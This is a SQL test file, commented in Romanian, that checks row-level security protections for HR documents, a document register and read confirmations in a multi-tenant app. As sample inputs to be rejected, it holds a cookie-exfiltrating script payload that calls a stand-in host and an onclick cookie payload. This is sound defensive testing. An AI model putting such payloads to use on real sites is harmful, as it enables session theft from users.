-- tests/rls/proba-acte-probatorii.sql
--
-- ACTELE CARE NU TREBUIE SĂ SE MAI SCHIMBE, DUPĂ 0148.
--
-- ── DE CE EXISTĂ FIȘIERUL ───────────────────────────────────────────────────
-- Un act emis, o înregistrare în registrul Ordinului 217/1996 și o confirmare de
-- citire valorează exact cât garanția că nu s-au schimbat după ce au fost făcute.
-- Până la 0148, garanția era scrisă în Server Action, iar baza accepta orice
-- PATCH. Verificările de mai jos o mută unde se poate dovedi.
--
-- Jumătate sunt POZITIVE, din același motiv ca la celelalte probe: o poartă prea
-- strâmtă pe registru sau pe documente nu se vede într-un ecran gol, ci într-un
-- act care nu se mai poate anula sau într-un dosar care nu se mai poate rezolva.
--
-- ── CE VERIFICĂ, PE RÂND ────────────────────────────────────────────────────
-- (1) un șablon cu `<script>` e refuzat;
-- (2) un șablon curat trece                                       [POZITIVĂ];
-- (3) un șablon cu `onclick=` e refuzat (atribut de eveniment);
-- (4) conținutul unui act EMIS nu se mai poate rescrie;
-- (5) dar actul se poate anula                                    [POZITIVĂ];
-- (6) semnătura de pe fișa postului nu se mai poate fabrica;
-- (7) conținutul unei înregistrări din registru e înghețat;
-- (8) dar rezolvarea dosarului se poate scrie                     [POZITIVĂ];
-- (9) un punct de lucru din altă firmă e refuzat la înregistrare;
-- (10) `citit_la` nu se mai poate antedata.
--
-- Rulare, pe bancul local (NICIODATĂ pe cloud):
--   bash .claude/skills/administrativo/scripts/banc-migrare.sh
\set ON_ERROR_STOP on
\pset pager off

do $$
declare
  v_sufix   text := left(replace(gen_random_uuid()::text, '-', ''), 8);
  v_org     uuid := gen_random_uuid();
  v_org_b   uuid := gen_random_uuid();
  v_u_hr    uuid := gen_random_uuid();
  v_u_adm   uuid := gen_random_uuid();
  v_u_ang   uuid := gen_random_uuid();
  v_e_ang   uuid := gen_random_uuid();
  v_act     uuid;
  v_fisa    uuid;
  v_inreg   uuid;
  v_anunt   uuid;
  v_punct_b uuid;
  v_text    text;
  v_moment  timestamptz;
  v_numar   integer;
  v_esecuri int := 0;
begin
  raise notice '';
  raise notice '  PROBA „ACTE CU VALOARE PROBATORIE" (0148)';
  raise notice '  ─────────────────────────────────────────────────────────';

  -- ── fixture ───────────────────────────────────────────────────────────────
  insert into public.organizations (id, slug, name, cui) values
    (v_org,   'proba-acte-'  || v_sufix, 'Proba Acte SRL',
     'RO' || (89000000 + (random() * 900000)::int)::text),
    (v_org_b, 'proba-acteb-' || v_sufix, 'Proba Acte B SRL',
     'RO' || (89000000 + (random() * 900000)::int)::text);
  insert into public.organization_features (organization_id, feature_key, enabled, activated_at)
  select v_org, f.feature_key, true, now() from public.features f;

  insert into auth.users (id, email, email_confirmed_at) values
    (v_u_hr,  'acte-hr-'  || v_sufix || '@proba.test', now()),
    (v_u_ang, 'acte-ang-' || v_sufix || '@proba.test', now()),
    (v_u_adm, 'acte-adm-' || v_sufix || '@proba.test', now());
  insert into public.organization_members (organization_id, user_id, role) values
    (v_org, v_u_hr,  'hr'),
    (v_org, v_u_ang, 'employee'),
    (v_org, v_u_adm, 'org_admin');
  insert into public.employees (id, organization_id, marca, first_name, last_name,
                                hired_on, status, user_id)
  values (v_e_ang, v_org, 'ACT-1', 'Ana', 'Angajat', app.azi_local() - 300, 'activ', v_u_ang);

  -- ═══ (1) Șablon cu `<script>` ═════════════════════════════════════════════
  perform set_config('request.jwt.claim.sub', v_u_hr::text, true);
  set local role authenticated;
  begin
    insert into public.hr_document_templates (organization_id, cod, denumire, continut_html)
    values (v_org, 'CTR-' || v_sufix, 'Contract',
            '<p>Salut</p><script>fetch("//x.test?c="+document.cookie)</script>');
    reset role;
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (1) șablonul cu `<script>` a fost acceptat';
  exception when raise_exception then
    reset role;
    raise notice '  ✓ (1) șablonul cu `<script>` e refuzat';
  end;

  -- ═══ (2) Șablon curat [POZITIVĂ] ══════════════════════════════════════════
  perform set_config('request.jwt.claim.sub', v_u_hr::text, true);
  set local role authenticated;
  begin
    insert into public.hr_document_templates (organization_id, cod, denumire, continut_html)
    values (v_org, 'CTR2-' || v_sufix, 'Contract curat',
            '<h1>Contract</h1><p>Între <strong>{{firma}}</strong> și {{angajat}}.</p>');
    reset role;
    raise notice '  ✓ (2) șablonul curat se salvează';
  exception when others then
    reset role;
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (2) șablonul curat a fost refuzat: % (%)', sqlerrm, sqlstate;
  end;

  -- ═══ (3) Atribut de eveniment ═════════════════════════════════════════════
  perform set_config('request.jwt.claim.sub', v_u_hr::text, true);
  set local role authenticated;
  begin
    insert into public.hr_document_templates (organization_id, cod, denumire, continut_html)
    values (v_org, 'CTR3-' || v_sufix, 'Contract cu eveniment',
            '<p onclick="alert(document.cookie)">Semnează aici</p>');
    reset role;
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (3) atributul de eveniment a fost acceptat';
  exception when raise_exception then
    reset role;
    raise notice '  ✓ (3) atributul de eveniment e refuzat';
  end;

  -- ═══ (4) Actul emis nu se rescrie ═════════════════════════════════════════
  insert into public.hr_issued_documents
    (organization_id, employee_id, serie, numar, numar_afisat, titlu,
     continut_html, continut_checksum)
  values (v_org, v_e_ang, 'CIM', 1, 'CIM-1', 'Contract individual de muncă',
          '<p>Salariu 5000 lei</p>', 'amprenta-initiala')
  returning id into v_act;

  perform set_config('request.jwt.claim.sub', v_u_hr::text, true);
  set local role authenticated;
  update public.hr_issued_documents
     set continut_html = '<p>Salariu 15000 lei</p>', continut_checksum = 'amprenta-noua'
   where id = v_act;
  reset role;
  select continut_html into v_text from public.hr_issued_documents where id = v_act;
  if v_text = '<p>Salariu 5000 lei</p>' then
    raise notice '  ✓ (4) conținutul actului emis rămâne neschimbat';
  else
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (4) actul emis a fost rescris: %', v_text;
  end if;

  -- ═══ (5) Dar se poate anula [POZITIVĂ] ════════════════════════════════════
  perform set_config('request.jwt.claim.sub', v_u_hr::text, true);
  set local role authenticated;
  update public.hr_issued_documents
     set anulat_la = now(), motiv_anulare = 'Emis din greșeală'
   where id = v_act;
  reset role;
  if exists (select 1 from public.hr_issued_documents where id = v_act and anulat_la is not null) then
    raise notice '  ✓ (5) actul emis se poate anula';
  else
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (5) anularea actului nu mai funcționează';
  end if;

  -- ═══ (5b) Anularea se vede și în registru (0158) [POZITIVĂ] ═══════════════
  -- hr n-are nicio cheie `registru:*`; anularea rândului din registru trebuie
  -- să treacă totuși, fiindcă dreptul care contează e cel pe document.
  if exists (
    select 1 from public.registru_documente
     where entitate_tip = 'hr_issued_documents' and entitate_id = v_act
       and anulat_la is not null and motiv_anulare like 'Documentul CIM-1 a fost anulat: Emis din greșeală'
  ) then
    raise notice '  ✓ (5b) anularea actului anulează și rândul din registru';
  else
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (5b) rândul din registru a rămas valabil după anularea actului';
  end if;

  -- ═══ (5c) Pe un exercițiu închis, anularea e respinsă de tot ═════════════
  insert into public.hr_issued_documents
    (organization_id, employee_id, serie, numar, numar_afisat, titlu,
     continut_html, continut_checksum)
  values (v_org, v_e_ang, 'NDA', 1, 'NDA-1', 'Acord de confidențialitate',
          '<p>NDA</p>', 'amprenta-nda')
  returning id into v_act;
  -- Rândul de exercițiu apare abia la închidere (0135), deci se creează aici.
  insert into public.registru_exercitii (organization_id, an, stare, inchis_la)
  select v_org, r.an, 'inchis', now()
    from public.registru_documente r
   where r.entitate_tip = 'hr_issued_documents' and r.entitate_id = v_act
  on conflict (organization_id, an) do update set stare = 'inchis', inchis_la = now();

  perform set_config('request.jwt.claim.sub', v_u_hr::text, true);
  set local role authenticated;
  begin
    update public.hr_issued_documents
       set anulat_la = now(), motiv_anulare = 'Emis din greșeală'
     where id = v_act;
    reset role;
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (5c) actul s-a anulat deși registrul anului e închis';
  exception when raise_exception then
    reset role;
    if exists (select 1 from public.hr_issued_documents where id = v_act and anulat_la is null) then
      raise notice '  ✓ (5c) pe un an închis, anularea e respinsă și actul rămâne valabil';
    else
      v_esecuri := v_esecuri + 1;
      raise warning '  ✗ (5c) actul a ieșit anulat deși eroarea a fost ridicată';
    end if;
  end;
  update public.registru_exercitii set stare = 'deschis', inchis_la = null
   where organization_id = v_org;

  -- ═══ (6) Semnătura fișei postului ═════════════════════════════════════════
  insert into public.job_descriptions
    (organization_id, employee_id, titlu, continut, valabil_de_la)
  values (v_org, v_e_ang, 'Fișa postului', 'Atribuții inițiale', app.azi_local() - 100)
  returning id into v_fisa;

  perform set_config('request.jwt.claim.sub', v_u_ang::text, true);
  set local role authenticated;
  begin
    update public.job_descriptions
       set semnat_de_angajat = true, semnat_la = now() - interval '200 days',
           semnatura_ip = '10.0.0.1', continut = 'Nu fac nimic'
     where id = v_fisa;
    reset role;
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (6) semnătura de pe fișa postului a fost fabricată';
  exception when insufficient_privilege then
    reset role;
    raise notice '  ✓ (6) semnătura și conținutul fișei postului nu se mai scriu din client';
  end;

  -- ═══ (7) Conținutul înregistrării din registru ════════════════════════════
  -- Numărul se calculează, nu se presupune: emiterea actului de la (4) a lăsat
  -- deja o înregistrare în registru, prin triggerul ei.
  select coalesce(max(numar), 0) + 1 into v_numar
    from public.registru_documente
   where organization_id = v_org and an = extract(year from current_date)::smallint;
  insert into public.registru_documente
    (organization_id, an, numar, numar_afisat, data_inregistrare, sens, tip_document,
     continut_rezumat, entitate_tip, emitent)
  values (v_org, extract(year from current_date)::smallint, v_numar,
          v_numar::text || '/' || extract(year from current_date)::text, current_date, 'intrare',
          'cerere', 'Demisie', 'employees', 'Ana Angajat')
  returning id into v_inreg;

  -- Scrie `org_admin`: `hr` n-are `registru:update` în seed, deci USING-ul
  -- politicii l-ar opri oricum, iar verificarea ar fi ieșit verde din alt motiv.
  perform set_config('request.jwt.claim.sub', v_u_adm::text, true);
  set local role authenticated;
  update public.registru_documente
     set continut_rezumat = 'Cerere de concediu', emitent = 'Altcineva'
   where id = v_inreg;
  reset role;
  select continut_rezumat into v_text from public.registru_documente where id = v_inreg;
  if v_text = 'Demisie' then
    raise notice '  ✓ (7) conținutul înregistrării e înghețat';
  else
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (7) înregistrarea a fost rescrisă: %', v_text;
  end if;

  -- ═══ (8) Rezolvarea dosarului [POZITIVĂ] ══════════════════════════════════
  perform set_config('request.jwt.claim.sub', v_u_adm::text, true);
  set local role authenticated;
  update public.registru_documente
     set mod_rezolvare = 'Clasat', rezolvat_la = now(), indicativ_dosar = 'I-1'
   where id = v_inreg;
  reset role;
  if exists (select 1 from public.registru_documente
              where id = v_inreg and mod_rezolvare = 'Clasat' and indicativ_dosar = 'I-1') then
    raise notice '  ✓ (8) rezolvarea dosarului se scrie în continuare';
  else
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (8) rezolvarea dosarului nu mai poate fi scrisă';
  end if;

  -- ═══ (9) Punct de lucru din altă firmă ════════════════════════════════════
  insert into public.puncte_lucru (organization_id, denumire)
  values (v_org_b, 'Punct străin')
  returning id into v_punct_b;

  begin
    insert into public.registru_documente
      (organization_id, an, numar, numar_afisat, data_inregistrare, sens, tip_document,
       continut_rezumat, entitate_tip, punct_lucru_id)
    values (v_org, extract(year from current_date)::smallint, v_numar + 1,
            (v_numar + 1)::text || '/' || extract(year from current_date)::text, current_date, 'iesire',
            'adeverinta', 'Adeverință', 'employees', v_punct_b);
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (9) s-a înregistrat un document pe punctul de lucru al altei firme';
  exception when raise_exception then
    raise notice '  ✓ (9) punctul de lucru străin e refuzat';
  end;

  -- ═══ (10) Confirmarea de citire nu se antedatează ═════════════════════════
  insert into public.announcements (organization_id, titlu, continut)
  values (v_org, 'Regulament intern', 'Textul regulamentului')
  returning id into v_anunt;

  perform set_config('request.jwt.claim.sub', v_u_ang::text, true);
  set local role authenticated;
  insert into public.announcement_reads (organization_id, announcement_id, employee_id, user_id, citit_la)
  values (v_org, v_anunt, v_e_ang, v_u_ang, now() - interval '30 days');
  reset role;
  select citit_la into v_moment from public.announcement_reads
   where announcement_id = v_anunt and user_id = v_u_ang;
  if v_moment > now() - interval '1 minute' then
    raise notice '  ✓ (10) `citit_la` e momentul real, nu cel trimis';
  else
    v_esecuri := v_esecuri + 1;
    raise warning '  ✗ (10) confirmarea de citire a fost antedatată la %', v_moment;
  end if;

  -- ── verdict ───────────────────────────────────────────────────────────────
  raise notice '  ─────────────────────────────────────────────────────────';
  if v_esecuri > 0 then
    raise exception 'PROBA ACTELOR PROBATORII: % verificări picate', v_esecuri;
  end if;
  raise notice '  TOATE cele 10 verificări au trecut.';
  raise notice '';
end;
$$;
